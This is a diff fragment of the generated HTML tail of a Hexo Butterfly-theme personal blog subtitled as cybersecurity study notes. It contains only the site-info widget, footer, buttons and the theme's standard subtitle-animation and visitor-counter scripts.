+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">46</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-06-18T13:44:09.705Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xuan23</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5-b1"></script><script src="/js/main.js?v=5.5.5-b1"></script><div class="js-pjax"><script>window.typedJSFn = {
+  init: str => {
+    window.typed = new Typed('#subtitle', Object.assign({
+      strings: str,
+      startDelay: 300,
+      typeSpeed: 150,
+      loop: true,
+      backSpeed: 50,
+    }, null))
+  },
+  run: subtitleType => {
+    if (true) {
+      if (typeof Typed === 'function') {
+        subtitleType()
+      } else {
+        btf.getScript('https://cdn.jsdelivr.net/npm/typed.js@3.0.0/dist/typed.umd.min.js').then(subtitleType)
+      }
+    } else {
+      subtitleType()
+    }
+  },
+  processSubtitle: (content, extraContents = []) => {
+    if (true) {
+      const sub = ["网络安全学习记录"].slice()
+
+      if (extraContents.length > 0) {
+        sub.unshift(...extraContents)
+      }
+
+      if (typeof content === 'string') {
+        sub.unshift(content)
+      } else if (Array.isArray(content)) {
+        sub.unshift(...content)
+      }
+
+      sub.length > 0 && typedJSFn.init(sub)
+    } else {
+      document.getElementById('subtitle').textContent = typeof content === 'string' ? content :
+        (Array.isArray(content) && content.length > 0 ? content[0] : '')
+    }
+  }
+}
+btf.addGlobalFn('pjaxSendOnce', () => { typed.destroy() }, 'typedDestroy')
+</script><script>function subtitleType () {
+  typedJSFn.processSubtitle(["网络安全学习记录"])
+}
+typedJSFn.run(subtitleType)</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
